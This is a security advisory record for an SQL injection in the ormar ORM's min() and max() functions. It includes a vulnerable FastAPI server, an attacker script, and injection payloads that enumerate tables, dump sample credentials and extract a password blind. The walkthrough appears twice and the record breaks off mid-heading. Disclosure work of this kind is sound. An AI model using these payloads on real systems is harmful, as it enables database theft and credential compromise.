{
  "id": "GHSA-xxh2-68g9-8jqr",
  "modified": "2026-02-24T16:20:26.892853Z",
  "published": "2026-02-23T22:12:17Z",
  "aliases": [
    "CVE-2026-26198"
  ],
  "summary": "ormar is vulnerable to SQL Injection through aggregate functions min() and max()",
  "details": "# Report of SQL Injection Vulnerability in Ormar ORM\n\n## A SQL Injection attack can be achieved by passing a crafted string to the min() or max() aggregate functions.\n\n## Brief description\n\nWhen performing aggregate queries, Ormar ORM constructs SQL expressions by passing user-supplied column names directly into `sqlalchemy.text()` without any validation or sanitization. The `min()` and `max()` methods in the `QuerySet` class accept arbitrary string input as the column parameter. While `sum()` and `avg()` are partially protected by an `is_numeric` type check that rejects non-existent fields, `min()` and `max()` skip this validation entirely. As a result, an attacker-controlled string is embedded as raw SQL inside the aggregate function call. Any unauthorized user can exploit this vulnerability to read the entire database contents, including tables unrelated to the queried model, by injecting a subquery as the column parameter.\n\n## Affected versions\n\n```\n0.9.9 - 0.12.2\n0.20.0b1 - 0.22.0 (latest)\n```\n\nThe vulnerable `SelectAction.get_text_clause()` method and the `min()`/`max()` aggregate functions were introduced together in commit `ff9d412` (March 12, 2021) and first released in version **0.9.9**. The vulnerable code has never been modified since — `get_text_clause()` is identical in every subsequent version through the latest **0.21.0**.\n\nVersions prior to 0.9.9 do not contain the `min()`/`max()` aggregate feature and are not affected.\n\nThe following uses the latest ormar 0.21.0 as an example to illustrate the attack.\n\n## Vulnerability details\n\nWhen performing an aggregate query, the `QuerySet.max()` method (line 721, `queryset.py`) passes user input to `_query_aggr_function()`. This method creates a `SelectAction` object for each column name. The column string is split by `__` and the last part becomes `self.field_name` — with no validation against the model's actual fields.\n\nThe critical vulnerability is in `SelectAction.get_text_clause()` (line 41-43, `select_action.py`), which directly passes `self.field_name` into `sqlalchemy.text()`:\n\n```python\n#select_action.py line 41-43\ndef get_text_clause(self) -\u003e sqlalchemy.sql.expression.TextClause:\n    alias = f\"{self.table_prefix}_\" if self.table_prefix else \"\"\n    return sqlalchemy.text(f\"{alias}{self.field_name}\")  # unsanitised user input!\n```\n\nThe `apply_func()` method then wraps this raw text clause inside `func.max()`, producing SQL like `max(\u003cattacker_input\u003e)`. Since `sqlalchemy.text()` treats its argument as literal SQL, any subquery or SQL expression injected through the column name will be executed by the database engine.\n\nThe `_query_aggr_function()` method (line 704-719, `queryset.py`) only validates field types for `sum` and `avg`, leaving `min` and `max` completely unprotected:\n\n```python\n#queryset.py line 704-719\nasync def _query_aggr_function(self, func_name: str, columns: List) -\u003e Any:\n    func = getattr(sqlalchemy.func, func_name)\n    select_actions = [\n        SelectAction(select_str=column, model_cls=self.model) for column in columns\n    ]\n    if func_name in [\"sum\", \"avg\"]:          # \u003c-- only sum/avg are checked!\n        if any(not x.is_numeric for x in select_actions):\n            raise QueryDefinitionError(...)\n    select_columns = [x.apply_func(func, use_label=True) for x in select_actions]\n    expr = self.build_select_expression().alias(f\"subquery_for_{func_name}\")\n    expr = sqlalchemy.select(*select_columns).select_from(expr)\n    result = await self.database.fetch_one(expr)\n    return dict(result) if len(result) \u003e 1 else result[0]\n```\n\nTo reproduce the attack, you can follow the steps below, using a FastAPI application with SQLite as an example.\n\nNote: The PoC consists of two files provided in the attachments — `poc_server.py` (the vulnerable server) and `poc_attacker.py` (the HTTP-based attacker script).\n\u003ch2\u003eStart the vulnerable application\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003eInstall dependencies:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003epip install ormar databases aiosqlite fastapi uvicorn httpx\n\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003eThe vulnerable server (\u003ccode\u003epoc_server.py\u003c/code\u003e) is based on the \u003cstrong\u003eofficial ormar FastAPI example\u003c/strong\u003e (\u003ca href=\"https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py\"\u003eormar/examples/fastapi_quick_start.py\u003c/a\u003e). The only modification is the addition of a \u003ccode\u003e/items/stats\u003c/code\u003e endpoint — a common pattern for applications that provide aggregate statistics. This demonstrates that the vulnerability is easily triggered by natural API design.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe server defines three models:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eCategory\u003c/code\u003e and \u003ccode\u003eItem\u003c/code\u003e — from the official ormar example (unchanged)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eAdminUser\u003c/code\u003e — simulates internal data (e.g., an admin_users table) that should NOT be accessible through the public API\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe vulnerable endpoint:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003e# Added endpoint: aggregate statistics (VULNERABLE)\n# This is a common and natural pattern — letting users request\n# statistics on different columns. The ormar documentation itself\n# shows: await Book.objects.max(columns=[\u0026quot;year\u0026quot;])\n# See: \u0026lt;https://collerek.github.io/ormar/queries/aggregations/\u0026gt;\n\n@app.get(\u0026quot;/items/stats\u0026quot;)\nasync def item_stats(\n    metric: str = Query(\u0026quot;max\u0026quot;, description=\u0026quot;max or min\u0026quot;),\n    column: str = Query(\u0026quot;price\u0026quot;, description=\u0026quot;Column to aggregate\u0026quot;),\n):\n    \u0026quot;\u0026quot;\u0026quot;Return aggregate statistics for items.\u0026quot;\u0026quot;\u0026quot;\n    if metric == \u0026quot;max\u0026quot;:\n        result = await Item.objects.max(column)\n    elif metric == \u0026quot;min\u0026quot;:\n        result = await Item.objects.min(column)\n    else:\n        return {\u0026quot;error\u0026quot;: \u0026quot;Unsupported metric\u0026quot;}\n    return {\u0026quot;metric\u0026quot;: metric, \u0026quot;column\u0026quot;: column, \u0026quot;result\u0026quot;: result}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe database contains:\u003c/p\u003e\n\nTable | Data\n-- | --\ncategories | Electronics\nitems | Laptop ($999.99), Phone ($699.99), Tablet ($449.99), Monitor ($329.99)\nadmin_users | root / Sup3r$ecretP@ss! / ak-9f8e7d6c5b4a3210-prod\n  | deploy-bot / ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi / ak-1a2b3c4d5e6f7890-ci\n\n\n\u003cp\u003eThe \u003ccode\u003eadmin_users\u003c/code\u003e table is \u003cstrong\u003eNOT\u003c/strong\u003e exposed via any API endpoint.\u003c/p\u003e\n\u003ch2\u003eThe attack steps\u003c/h2\u003e\n\u003cp\u003eThe PoC requires two terminals:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTerminal 1\u003c/strong\u003e — Start the vulnerable server:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003epython poc_server.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eTerminal 2\u003c/strong\u003e — Run the attacker script:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003epython poc_attacker.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe attacker script (\u003ccode\u003epoc_attacker.py\u003c/code\u003e) sends HTTP requests to the running server. It has \u003cstrong\u003eNO prior knowledge\u003c/strong\u003e of the database schema — all information is discovered through the injection. The attacker executes 6 progressive attack stages through the single \u003ccode\u003e/items/stats\u003c/code\u003e endpoint.\u003c/p\u003e\n\u003ch2\u003ePrinciple of vulnerability exploitation\u003c/h2\u003e\n\u003ch3\u003e1. The attacker confirms injection by sending an arithmetic expression\u003c/h3\u003e\n\u003cp\u003eThe attacker sends \u003ccode\u003eGET /items/stats?metric=max\u0026amp;column=1+1\u003c/code\u003e. The data flow is:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eHTTP request: GET /items/stats?metric=max\u0026amp;column=1+1\n    ↓\nitem_stats(metric=\u0026quot;max\u0026quot;, column=\u0026quot;1+1\u0026quot;)                # poc_server.py\n    ↓\nItem.objects.max(\u0026quot;1+1\u0026quot;)                                # queryset.py:721\n    ↓\n_query_aggr_function(func_name=\u0026quot;max\u0026quot;, columns=[\u0026quot;1+1\u0026quot;]) # queryset.py:704\n    ↓\nSelectAction(select_str=\u0026quot;1+1\u0026quot;, model_cls=Item)          # select_action.py:22\n    ↓\n_split_value_into_parts(\u0026quot;1+1\u0026quot;)  →  self.field_name = \u0026quot;1+1\u0026quot;\n    ↓\n# min/max skip the is_numeric check (line 709 only checks sum/avg)\n    ↓\nget_text_clause()  →  sqlalchemy.text(\u0026quot;1+1\u0026quot;)            # select_action.py:43\n    ↓\napply_func(sqlalchemy.func.max)  →  max(1+1)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eGenerated SQL:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sql\"\u003eSELECT max(1+1) AS \u0026quot;1+1\u0026quot;\nFROM (SELECT items.id AS id, items.name AS name, items.price AS price,\n             items.category AS category\n      FROM items) AS subquery_for_max\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe API returns \u003ccode\u003e{\u0026quot;metric\u0026quot;:\u0026quot;max\u0026quot;,\u0026quot;column\u0026quot;:\u0026quot;1+1\u0026quot;,\u0026quot;result\u0026quot;:2}\u003c/code\u003e, confirming that the arithmetic expression was evaluated as SQL.\u003c/p\u003e\n\u003ch3\u003e2. The attacker enumerates database tables\u003c/h3\u003e\n\u003cp\u003eThe attacker injects a subquery to read \u003ccode\u003esqlite_master\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eGET /items/stats?metric=max\u0026amp;column=(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhich internally calls:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003eawait Item.objects.max(\n    \u0026quot;(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')\u0026quot;\n)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eGenerated SQL:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sql\"\u003eSELECT max((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'))\n       AS \u0026quot;(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')\u0026quot;\nFROM (SELECT items.id, items.name, items.price, items.category\n      FROM items) AS subquery_for_max\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe API returns \u003ccode\u003ecategories,admin_users,items\u003c/code\u003e, revealing the hidden \u003ccode\u003eadmin_users\u003c/code\u003e table.\u003c/p\u003e\n\u003ch3\u003e3. The attacker extracts the schema of the target table\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003eGET /items/stats?metric=max\u0026amp;column=(SELECT sql FROM sqlite_master WHERE name='admin_users')\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe API returns the full \u003ccode\u003eCREATE TABLE\u003c/code\u003e statement, revealing column names: \u003ccode\u003eusername\u003c/code\u003e, \u003ccode\u003epassword\u003c/code\u003e, \u003ccode\u003eapi_key\u003c/code\u003e.\u003c/p\u003e\n\u003ch3\u003e4. The attacker dumps all credentials in a single query\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003eGET /items/stats?metric=max\u0026amp;column=(SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10)) FROM admin_users)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eGenerated SQL:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sql\"\u003eSELECT max((SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10))\n            FROM admin_users))\n       AS \u0026quot;...\u0026quot;\nFROM (SELECT items.id, items.name, items.price, items.category\n      FROM items) AS subquery_for_max\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe API returns all credentials:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eroot | Sup3r$ecretP@ss! | ak-9f8e7d6c5b4a3210-prod\ndeploy-bot | ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi | ak-1a2b3c4d5e6f7890-ci\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e5. Blind boolean-based extraction (when results are not directly visible)\u003c/h3\u003e\n\u003cp\u003eEven if the API does not return query results directly, the attacker can use boolean-based blind injection to extract data character by character using binary search:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eGET /items/stats?metric=max\u0026amp;column=CASE WHEN UNICODE(SUBSTR((SELECT password FROM admin_users WHERE username='root'),1,1))\u0026gt;83 THEN 1 ELSE 0 END\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhich internally calls:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003e# \u0026quot;Is the Nth character of root's password greater than ASCII code M?\u0026quot;\nawait Item.objects.max(\n    \u0026quot;CASE WHEN UNICODE(SUBSTR(\u0026quot;\n    \u0026quot;(SELECT password FROM admin_users WHERE username='root'),1,1))\u0026gt;83 \u0026quot;\n    \u0026quot;THEN 1 ELSE 0 END\u0026quot;\n)\n# Returns 0 → first character is 'S' (ASCII 83)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBy iterating over each position with binary search, the full password \u003ccode\u003eSup3r$ecretP@ss!\u003c/code\u003e is extracted in approximately 113 HTTP requests (16 characters x ~7 binary search steps).\u003c/p\u003e\n\u003ch3\u003e6. The attacker extracts the production API key\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003eGET /items/stats?metric=max\u0026amp;column=(SELECT api_key FROM admin_users WHERE username='root')\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe API returns: \u003ccode\u003eak-9f8e7d6c5b4a3210-prod\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eAll data was extracted through a single public API endpoint using only unauthenticated GET requests.\u003c/p\u003e\n\u003c!-- notionvc: b3e8123b-0876-4c76-94f6-2281c6cbb3f0 --\u003e## Start the vulnerable application\n\n1. Install dependencies:\n\n```bash\npip install ormar databases aiosqlite fastapi uvicorn httpx\n```\n\n1. The vulnerable server (`poc_server.py`) is based on the **official ormar FastAPI example** ([[ormar/examples/fastapi_quick_start.py](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)). The only modification is the addition of a `/items/stats` endpoint — a common pattern for applications that provide aggregate statistics. This demonstrates that the vulnerability is easily triggered by natural API design.\n\nThe server defines three models:\n\n- `Category` and `Item` — from the official ormar example (unchanged)\n- `AdminUser` — simulates internal data (e.g., an admin_users table) that should NOT be accessible through the public API\n\nThe vulnerable endpoint:\n\n```python\n# Added endpoint: aggregate statistics (VULNERABLE)\n# This is a common and natural pattern — letting users request\n# statistics on different columns. The ormar documentation itself\n# shows: await Book.objects.max(columns=[\"year\"])\n# See: \u003chttps://collerek.github.io/ormar/queries/aggregations/\u003e\n\n@app.get(\"/items/stats\")\nasync def item_stats(\n    metric: str = Query(\"max\", description=\"max or min\"),\n    column: str = Query(\"price\", description=\"Column to aggregate\"),\n):\n    \"\"\"Return aggregate statistics for items.\"\"\"\n    if metric == \"max\":\n        result = await Item.objects.max(column)\n    elif metric == \"min\":\n        result = await Item.objects.min(column)\n    else:\n        return {\"error\": \"Unsupported metric\"}\n    return {\"metric\": metric, \"column\": column, \"result\": result}\n```\n\nThe database contains:\n\n| Table | Data |\n| --- | --- |\n| `categories` | Electronics |\n| `items` | Laptop ($999.99), Phone ($699.99), Tablet ($449.99), Monitor ($329.99) |\n| `admin_users` | root / Sup3r$ecretP@ss! / ak-9f8e7d6c5b4a3210-prod |\n|  | deploy-bot / ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi / ak-1a2b3c4d5e6f7890-ci |\n\nThe `admin_users` table is **NOT** exposed via any API endpoint.\n\n## The attack steps\n\nThe PoC requires two terminals:\n\n**Terminal 1** — Start the vulnerable server:\n\n```bash\npython poc_server.py\n```\n\n**Terminal 2** — Run the attacker script:\n\n```bash\npython poc_attacker.py\n```\n\nThe attacker script (`poc_attacker.py`) sends HTTP requests to the running server. It has **NO prior knowledge** of the database schema — all information is discovered through the injection. The attacker executes 6 progressive attack stages through the single `/items/stats` endpoint.\n\n## Principle of vulnerability exploitation\n\n### 1. The attacker confirms injection by sending an arithmetic expression\n\nThe attacker sends `GET /items/stats?metric=max\u0026column=1+1`. The data flow is:\n\n```\nHTTP request: GET /items/stats?metric=max\u0026column=1+1\n    ↓\nitem_stats(metric=\"max\", column=\"1+1\")                # poc_server.py\n    ↓\nItem.objects.max(\"1+1\")                                # queryset.py:721\n    ↓\n_query_aggr_function(func_name=\"max\", columns=[\"1+1\"]) # queryset.py:704\n    ↓\nSelectAction(select_str=\"1+1\", model_cls=Item)          # select_action.py:22\n    ↓\n_split_value_into_parts(\"1+1\")  →  self.field_name = \"1+1\"\n    ↓\n# min/max skip the is_numeric check (line 709 only checks sum/avg)\n    ↓\nget_text_clause()  →  sqlalchemy.text(\"1+1\")            # select_action.py:43\n    ↓\napply_func(sqlalchemy.func.max)  →  max(1+1)\n```\n\nGenerated SQL:\n\n```sql\nSELECT max(1+1) AS \"1+1\"\nFROM (SELECT items.id AS id, items.name AS name, items.price AS price,\n             items.category AS category\n      FROM items) AS subquery_for_max\n```\n\nThe API returns `{\"metric\":\"max\",\"column\":\"1+1\",\"result\":2}`, confirming that the arithmetic expression was evaluated as SQL.\n\n### 2. The attacker enumerates database tables\n\nThe attacker injects a subquery to read `sqlite_master`:\n\n```\nGET /items/stats?metric=max\u0026column=(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')\n```\n\nWhich internally calls:\n\n```python\nawait Item.objects.max(\n    \"(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')\"\n)\n```\n\nGenerated SQL:\n\n```sql\nSELECT max((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'))\n       AS \"(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')\"\nFROM (SELECT items.id, items.name, items.price, items.category\n      FROM items) AS subquery_for_max\n```\n\nThe API returns `categories,admin_users,items`, revealing the hidden `admin_users` table.\n\n### 3. The attacker extracts the schema of the target table\n\n```\nGET /items/stats?metric=max\u0026column=(SELECT sql FROM sqlite_master WHERE name='admin_users')\n```\n\nThe API returns the full `CREATE TABLE` statement, revealing column names: `username`, `password`, `api_key`.\n\n### 4. The attacker dumps all credentials in a single query\n\n```\nGET /items/stats?metric=max\u0026column=(SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10)) FROM admin_users)\n```\n\nGenerated SQL:\n\n```sql\nSELECT max((SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10))\n            FROM admin_users))\n       AS \"...\"\nFROM (SELECT items.id, items.name, items.price, items.category\n      FROM items) AS subquery_for_max\n```\n\nThe API returns all credentials:\n\n```\nroot | Sup3r$ecretP@ss! | ak-9f8e7d6c5b4a3210-prod\ndeploy-bot | ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi | ak-1a2b3c4d5e6f7890-ci\n```\n\n### 5. Blind boolean-based extraction (when results are not directly visible)\n\nEven if the API does not return query results directly, the attacker can use boolean-based blind injection to extract data character by character using binary search:\n\n```\nGET /items/stats?metric=max\u0026column=CASE WHEN UNICODE(SUBSTR((SELECT password FROM admin_users WHERE username='root'),1,1))\u003e83 THEN 1 ELSE 0 END\n```\n\nWhich internally calls:\n\n```python\n# \"Is the Nth character of root's password greater than ASCII code M?\"\nawait Item.objects.max(\n    \"CASE WHEN UNICODE(SUBSTR(\"\n    \"(SELECT password FROM admin_users WHERE username='root'),1,1))\u003e83 \"\n    \"THEN 1 ELSE 0 END\"\n)\n# Returns 0 → first character is 'S' (ASCII 83)\n```\n\nBy iterating over each position with binary search, the full password `Sup3r$ecretP@ss!` is extracted in approximately 113 HTTP requests (16 characters x ~7 binary search steps).\n\n### 6. The attacker extracts the production API key\n\n```\nGET /items/stats?metric=max\u0026column=(SELECT api_key FROM admin_users WHERE username='root')\n```\n\nThe API returns: `ak-9f8e7d6c5b4a3210-prod`\n\nAll data was extracted through a single public API endpoint using only unauthenticated GET requests.\n## The complete POC\n\n### poc_server.py (Vulnerable Server)\n\nBased on the official ormar FastAPI example ([[fastapi_quick_start.py](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)):\n\n```python\n\"\"\"\nCVE PoC — Vulnerable Server\n=============================\nBased on the OFFICIAL ormar FastAPI example:\n    \u003chttps://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py\u003e\n\nThe only modification is the addition of a /items/stats endpoint (line 63-76),\nwhich is a common pattern for any application that provides aggregate statistics.\n\nUsage:\n    python poc_server.py\n\"\"\"\n\n# ── Original official example code (unchanged) ───────────────\n# Source: ormar/examples/fastapi_quick_start.py\n\nfrom contextlib import asynccontextmanager\nfrom typing import List, Optional\n\nimport databases\nimport ormar\nimport sqlalchemy\nimport uvicorn\nfrom fastapi import FastAPI, Query\n\nDATABASE_URL = \"sqlite:///poc_vuln.db\"\n\normar_base_config = ormar.OrmarConfig(\n    database=databases.Database(DATABASE_URL), metadata=sqlalchemy.MetaData()\n)\n\nclass Category(ormar.Model):\n    ormar_config = ormar_base_config.copy(tablename=\"categories\")\n\n    id: int = ormar.Integer(primary_key=True)\n    name: str = ormar.String(max_length=100)\n\nclass Item(ormar.Model):\n    ormar_config = ormar_base_config.copy(tablename=\"items\")\n\n    id: int = ormar.Integer(primary_key=True)\n    name: str = ormar.String(max_length=100)\n    price: float = ormar.Float(default=0)\n    category: Optional[Category] = ormar.ForeignKey(Category, nullable=True)\n\n# This table simulates internal data that should NOT be accessible\n# through the public API — e.g. an admin_users table in the same database.\nclass AdminUser(ormar.Model):\n    ormar_config = ormar_base_config.copy(tablename=\"admin_users\")\n\n    id: int = ormar.Integer(primary_key=True)\n    username: str = ormar.String(max_length=100)\n    password: str = ormar.String(max_length=200)\n    api_key: str = ormar.String(max_length=200)\n\n@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    database_ = ormar_base_config.database\n    if not database_.is_connected:\n        await database_.connect()\n\n    # Create tables\n    engine = sqlalchemy.create_engine(DATABASE_URL)\n    ormar_base_config.metadata.create_all(engine)\n    engine.dispose()\n\n    # Seed sample data\n    if not await Item.objects.count():\n        cat = await Category.objects.create(name=\"Electronics\")\n        await Item.objects.create(name=\"Laptop\", price=999.99, category=cat)\n        await Item.objects.create(name=\"Phone\", price=699.99, category=cat)\n        await Item.objects.create(name=\"Tablet\", price=449.99, category=cat)\n        await Item.objects.create(name=\"Monitor\", price=329.99, category=cat)\n\n    if not await AdminUser.objects.count():\n        await AdminUser.objects.create(\n            username=\"root\",\n            password=\"Sup3r$ecretP@ss!\",\n            api_key=\"ak-9f8e7d6c5b4a3210-prod\",\n        )\n        await AdminUser.objects.create(\n            username=\"deploy-bot\",\n            password=\"ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi\",\n            api_key=\"ak-1a2b3c4d5e6f7890-ci\",\n        )\n\n    print(\"\\\\n  [Server] Ready. Database seeded with items + admin_users.\")\n    print(\"  [Server] The admin_users table is NOT exposed via any API endpoint.\\\\n\")\n\n    yield\n\n    if database_.is_connected:\n        await database_.disconnect()\n\napp = FastAPI(\n    title=\"Item Catalog API\",\n    description=\"Based on official ormar FastAPI example\",\n    lifespan=lifespan,\n)\n\n# ── Original endpoints from official example (unchanged) ──────\n\n@app.get(\"/items/\", response_model=List[Item])\nasync def get_items():\n    items = await Item.objects.select_related(\"category\").all()\n    return items\n\n@app.post(\"/items/\", response_model=Item)\nasync def create_item(item: Item):\n    await item.save()\n    return item\n\n@app.post(\"/categories/\", response_model=Category)\nasync def create_category(category: Category):\n    await category.save()\n    return category\n\n@app.put(\"/items/{item_id}\")\nasync def get_item(item_id: int, item: Item):\n    item_db = await Item.objects.get(pk=item_id)\n    return await item_db.update(**item.model_dump())\n\n@app.delete(\"/items/{item_id}\")\nasync def delete_item(item_id: int, item: Item = None):\n    if item:\n        return {\"deleted_rows\": await item.delete()}\n    item_db = await Item.objects.get(pk=item_id)\n    return {\"deleted_rows\": await item_db.delete()}\n\n# ── Added endpoint: aggregate statistics (VULNERABLE) ─────────\n# This is a common and natural pattern — letting users request\n# statistics on different columns. The ormar documentation itself\n# shows: await Book.objects.max(columns=[\"year\"])\n# See: \u003chttps://collerek.github.io/ormar/queries/aggregations/\u003e\n\n@app.get(\"/items/stats\")\nasync def item_stats(\n    metric: str = Query(\"max\", description=\"max or min\"),\n    column: str = Query(\"price\", description=\"Column to aggregate\"),\n):\n    \"\"\"Return aggregate statistics for items.\"\"\"\n    if metric == \"max\":\n        result = await Item.objects.max(column)\n    elif metric == \"min\":\n        result = await Item.objects.min(column)\n    else:\n        return {\"error\": \"Unsupported metric\"}\n    return {\"metric\": metric, \"column\": column, \"result\": result}\n\n@app.get(\"/health\")\nasync def health():\n    return {\"status\": \"ok\"}\n\n# ── Main ──────────────────────────────────────────────────────\nif __name__ == \"__main__\":\n    import os\n    # Clean previous database for reproducibility\n    if os.path.exists(\"poc_vuln.db\"):\n        os.unlink(\"poc_vuln.db\")\n    print(\"=\" * 60)\n    print(\"  CVE PoC — Vulnerable Server\")\n    print(\"  Based on: ormar/examples/fastapi_quick_start.py\")\n    print(\"  Added:    GET /items/stats?metric=max\u0026column=\u003cinput\u003e\")\n    print(\"  Docs:     \u003chttp://127.0.0.1:8000/docs\u003e\")\n    print(\"=\" * 60)\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000, log_level=\"warning\")\n```\n\n### poc_attacker.py (Attacker Script)\n\n```python\n\"\"\"\nCVE PoC — Attacker Script\n===========================\nExploits the SQL injection in /items/stats endpoint.\nSends HTTP requests to the running FastAPI server.\n\nPrerequisites:\n    1. Start the server first:  python poc_server.py\n    2. Then run this script:    python poc_attacker.py\n\nThe attacker has NO prior knowledge of the database schema.\nAll information is discovered through the injection.\n\"\"\"\n\nimport sys\nimport httpx\n\nTARGET = \"\u003chttp://127.0.0.1:8000\u003e\"\nENDPOINT = \"/items/stats\"\n\ndef inject(payload: str) -\u003e str:\n    \"\"\"Send a single injection payload via the public API.\"\"\"\n    resp = httpx.get(TARGET + ENDPOINT, params={\"metric\": \"max\", \"column\": payload})\n    data = resp.json()\n    return data.get(\"result\")\n\ndef main():\n    # ── Pre-check ─────────────────────────────────────────────\n    try:\n        r = httpx.get(TARGET + \"/health\", timeout=3)\n        if r.status_code != 200:\n            sys.exit(1)\n    except httpx.ConnectError:\n        print(f\"Cannot connect to {TARGET}\")\n        print(f\"Start the server first: python poc_server.py\")\n        sys.exit(1)\n\n    # ── Stage 0: Legitimate request ──────────────────────────\n    result = inject(\"price\")\n    print(f\"[Stage 0] Normal usage: max(price) = {result}\")\n\n    # ── Stage 1: Confirm injection ────────────────────────────\n    result = inject(\"1+1\")\n    print(f\"[Stage 1] max('1+1') = {result}\")\n    if result == 2:\n        print(\"  → SQL INJECTION CONFIRMED\")\n\n    # ── Stage 2: Enumerate tables ─────────────────────────────\n    payload = \"(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')\"\n    result = inject(payload)\n    tables = str(result).split(\",\") if result else []\n    print(f\"[Stage 2] Tables: {result}\")\n\n    # ── Stage 3: Extract schema ───────────────────────────────\n    target_table = [t for t in tables if \"admin\" in t.lower()]\n    target_table = target_table[0] if target_table else tables[-1]\n    payload = f\"(SELECT sql FROM sqlite_master WHERE name='{target_table}')\"\n    result = inject(payload)\n    print(f\"[Stage 3] Schema of {target_table}: {result}\")\n\n    # ── Stage 4: Dump all credentials ─────────────────────────\n    payload = (\n        f\"(SELECT GROUP_CONCAT(\"\n        f\"username || ' | ' || password || ' | ' || api_key, CHAR(10))\"\n        f\" FROM {target_table})\"\n    )\n    result = inject(payload)\n    print(f\"[Stage 4] Credentials:\\\\n{result}\")\n\n    # ── Stage 5: Blind extraction ─────────────────────────────\n    payload = f\"LENGTH((SELECT password FROM {target_table} WHERE username='root'))\"\n    pw_len = int(inject(payload))\n    extracted = \"\"\n    request_count = 0\n    for pos in range(1, pw_len + 1):\n        low, high = 32, 126\n        while low \u003c= high:\n            mid = (low + high) // 2\n            payload = (\n                f\"CASE WHEN UNICODE(SUBSTR(\"\n                f\"(SELECT password FROM {target_table} \"\n                f\"WHERE username='root'),{pos},1))\u003e{mid} \"\n                f\"THEN 1 ELSE 0 END\"\n            )\n            result = inject(payload)\n            request_count += 1\n            if result == 1:\n                low = mid + 1\n            else:\n                high = mid - 1\n        extracted += chr(low)\n        sys.stdout.write(f\"\\\\r[Stage 5] Extracting: {extracted}\")\n        sys.stdout.flush()\n    print(f\"\\\\n[Stage 5] Password extracted: {extracted} ({request_count} requests)\")\n\n    # ── Stage 6: Steal API key ────────────────────────────────\n    payload = f\"(SELECT api_key FROM {target_table} WHERE username='root')\"\n    result = inject(payload)\n    print(f\"[Stage 6] Production API key: {result}\")\n\n    print(f\"\\\\nTotal HTTP requests: {request_count + 6}\")\n    print(\"All data extracted through a single public API endpoint.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## Vulnerability Impact\n\nThis attack allows an unauthenticated user to read the entire database contents. Any API endpoint that passes user-controlled input to `Model.objects.min()` or `Model.objects.max()` becomes a full SQL injection entry point.\n\nThe attack is confirmed to work with the following database backends:\n\n- SQLite (via aiosqlite)\n- PostgreSQL (via asyncpg) — subquery syntax is identical\n- MySQL (via aiomysql) — subquery syntax is compatible\n\n**Realistic attack scenarios 